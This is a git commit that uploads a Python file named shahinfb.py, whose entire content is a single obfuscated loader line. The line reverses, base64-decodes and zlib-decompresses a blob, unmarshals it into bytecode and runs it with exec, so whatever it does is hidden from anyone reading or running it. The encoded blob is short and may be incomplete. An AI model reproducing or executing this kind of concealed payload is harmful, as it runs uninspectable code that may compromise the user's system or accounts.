3b6583c72fa14175f9ca9410796e40013c3cb77d
JOY-VERSE50 <urjoybabe10@gmail.com>
2024-09-19 15:40:20 +0600

    Add files via upload

---
+++ shahinfb.py
@@ -0,0 +1,3 @@
+
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==QbPQMoAUcAxQhRBEI+IjMzAjPk/EzVUtQEdpqTppkfu10hX4uwmm9izTSGxTCChK5tonMoMDhwQ6MmQuxM6DFjCAkZLxJe'))
